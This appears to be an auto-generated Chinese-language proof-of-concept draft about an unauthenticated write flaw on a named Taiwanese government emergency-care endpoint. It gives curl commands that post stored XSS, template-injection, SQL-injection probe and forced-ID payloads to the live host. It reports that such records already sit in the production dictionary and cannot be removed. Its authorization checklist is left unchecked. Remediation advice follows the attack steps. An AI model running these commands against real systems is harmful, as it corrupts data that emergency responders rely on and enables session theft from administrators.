# POC/EXP 草稿 - 4008 /MciTypes 無認證寫入 + Stored XSS 持久化（不對稱鑒權設計漏洞）

> 自动生成时间: 2026-09-10 23:37:59  |  状态: **草稿（未验证）**  |  文件: `719bf5bd-c811-45ca-a58d-1f5c2e6ed521-4008-mcitypes-無認證寫入-stored-xss-持久化-不對稱.md`

## 漏洞信息

- **漏洞ID**: 719bf5bd-c811-45ca-a58d-1f5c2e6ed521
- **严重程度**: critical
- **状态**: open
- **类型**: Stored XSS / Broken Access Control / Mass Assignment
- **目标**: https://epcr.tpf.gov.tw:4008/MciTypes (集合級 NOAUTH + Stored XSS + 業務字典污染)
- **发现时间**: 2026-08-29 18:00:19

## 漏洞描述

4008 /MciTypes 端點的集合級 GET 與 POST 完全無需認證，PUT/PATCH/DELETE 資源級 401（486B "No authorization token was found"）—— 形成**不對稱鑒權設計**。攻擊者可匿名 GET 列出全部業務字典（含已注入的 Stored XSS payload id=1003/1024/1025），並通過 POST 寫入任意攻擊 payload 包括 Stored XSS、SQLi 探測、強制 ID 寫入。當管理員登入 4008 前端查看 MciTypes 字典時將觸發存儲 XSS。

## 前置条件

無需認證、無需登入態、無 CORS 限制、可從互聯網直接訪問 https://epcr.tpf.gov.tw:4008/MciTypes

## POC / EXP 验证指南

### 复现步骤（来自漏洞记录）

1. 訪問 https://epcr.tpf.gov.tw:4008/MciTypes（無需登入），確認返回 200 OK 含全部業務字典
2. 2. 使用 curl POST 寫入 Stored XSS：
3. ```
4. curl -X POST -H "Content-Type: application/json" \
5. -d '{"name":"<script>alert(1)</script>"}' \
6. https://epcr.tpf.gov.tw:4008/MciTypes
7. ```
8. 3. 預期結果：返回 201 Created，response body 含 `"id":1003`（或更新的 ID）
9. 4. 驗證持久化：再次 GET https://epcr.tpf.gov.tw:4008/MciTypes 確認新記錄存在
10. 5. 嘗試清理：curl -X DELETE https://epcr.tpf.gov.tw:4008/MciTypes/{id} → 應返回 401 "No authorization token was found"
11. 6. 確認不對稱鑒權：GET/POST 200/201（NOAUTH），DELETE/PUT/PATCH 401（鑒權開啟）


### 验证要点与安全基线

- [ ] 确认目标属于合法授权测试范围，非授权测试属于违法行为
- [ ] 交叉校验目标版本、已知 CVE/公开情报库（可联动 cve-poc-emerging-intel / vuln-intel）
- [ ] 使用最小化无害 payload / HTTP 请求逐步探测，记录原始请求与响应报文
- [ ] 验证失败时记录负结果，避免误报；未经真实环境验证不得标记为 confirmed

### 既有证据 / 原始报文

```http
**Stored XSS（id=1003 已寫入）**：
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>"}' \
  https://epcr.tpf.gov.tw:4008/MciTypes
# 響應: 201 Created
```
**XSS + SSTI（id=1024）**：
```bash
curl -X POST -d '{"name":"{{constructor.constructor(\"alert(1)\")()}}"}' \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```
**SQLi 探測（id=1025）**：
```bash
curl -X POST -d "{\"name\":\"test' OR 1=1 --\"}" \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```
**強制 ID 寫入（id=1000001）**：
```bash
curl -X POST -d '{"name":"TestForcedId","id":1000001}' \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```
```

## 安全影响

1. Stored XSS 持久化：管理員登入查看字典時觸發任意 JS，可竊取會話/CSRF/SSRF
2. 業務字典污染：覆蓋案件類型誤導現場救護人員
3. SQLi 攻擊面擴展：強制 ID 寫入 + 髒數據繞過二次查詢
4. 無法清理：DELETE 401，需 DB 管理員手動清理
5. 歷史污染：表中已存在 8+ 條歷史測試記錄（id=5-10/999/1000/1001-1006/1012/1024-1026/1000001）
6. 不對稱鑒權：證明 Express middleware 錯誤配置

## 修复建议

1. **立即修復**：在 /MciTypes 集合級路由掛載 auth middleware（與資源級保持一致），拒絕未認證 GET/POST 訪問
2. **清理現有污染數據**：通過 SQL 直接刪除 id=5-10/999/1000/1001-1006/1012/1024-1026/1000001 等異常記錄
3. **輸入校驗**：name 字段增加 HTML 轉義、長度限制（<=255）、類型校驗（必須為 string）
4. **Mass Assignment 防護**：禁止客戶端傳入 `id` 字段（即使 Sequelize 接受也應在 controller 層過濾）
5. **CSP**：在 4008 響應頭新增 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' 阻斷 inline script
6. **WAF 規則**：部署 WAF 過濾 MciTypes POST body 中的 `<script>`/`{{`/`'` 等危險字符
7. **日誌告警**：監控 MciTypes POST 寫入異常（高頻、特殊字符），觸發告警

## 复测验证方法

修復後應驗證：
1. GET https://epcr.tpf.gov.tw:4008/MciTypes 不帶 token 應返回 401
2. POST https://epcr.tpf.gov.tw:4008/MciTypes 不帶 token 應返回 401
3. DELETE/PUT/PATCH /MciTypes/{id} 仍應返回 401（保持原有鑒權）
4. 帶有效 JWT 後所有操作應正常工作
5. id=1003/1024/1025/1000001 等污染記錄應從數據庫清除

## 免责声明

本文件由 JySecAI 自动生成，仅供安全研究与合法授权渗透测试使用。未经授权对目标进行攻击测试属于违法行为。
